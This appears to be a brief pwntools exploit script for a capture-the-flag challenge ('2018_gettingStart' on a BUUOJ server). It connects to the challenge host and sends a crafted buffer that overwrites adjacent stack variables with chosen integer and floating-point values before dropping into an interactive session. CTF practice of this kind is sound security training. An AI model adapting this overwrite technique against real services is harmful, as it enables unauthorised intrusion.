from pwn import *

#p = process("./2018_gettingStart")
p = remote("node3.buuoj.cn",29552)
#gdb.attach(p,"b *0x0000000000000A47")
payload = p64(0)*3 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
p.sendafter("depends on you.",payload)

p.interactive()